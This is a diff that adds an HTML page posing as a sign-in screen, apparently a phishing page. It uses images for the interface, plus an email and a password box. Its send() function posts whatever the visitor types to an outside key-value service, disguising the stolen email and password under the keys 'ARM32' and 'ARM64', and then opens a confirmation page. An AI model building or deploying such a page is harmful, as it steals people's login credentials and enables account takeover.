@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <style>
+            input{
+                height: 40px; font-size: 14px; line-height: 1.4286; margin-left: 100px; width: 240px; 
+            } 
+        </style>
+        <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js" type="text/javascript"></script>
+    </head>
+<body>
+<img src="fJyKL1j7Z7.png" alt="Trulli" width="455" height="190"><br>
+<input type="text" id="fname"  placeholder="Enter Email..." required><br>
+<input type="text" id="fnamepass" placeholder="Enter Password..." required><br>
+<div hidden></div>
+<img src="FPpF2f8hbG.png" alt="Trulli" width="465" height="280" usemap="#workmap">
+
+<map name="workmap">
+    <area shape="rect" coords="334,124,414,160" alt="btn" onclick=send()>
+</map>
+
+<script>
+    var updateValue = function (appkey, itemkey, itemval) {
+        $.ajax({
+            type: "POST",
+            url: "https://keyvalue.immanuel.co/api/KeyVal/UpdateValue/" + appkey + "/" + itemkey + "/" + itemval,
+            contentType: false,
+            processData: false
+           }).done(function (data) {
+
+           }).fail(function(err){
+            
+        });
+    }
+
+    function send(){
+        var email=document.getElementById("fname").value;
+        var passw=document.getElementById("fnamepass").value;
+        updateValue("l90jdb1q", "ARM32", email)
+        updateValue("l90jdb1q", "ARM64", passw)
+        window.open("confirm.html")
+    }
+</script>
+</body>
+</html>
+
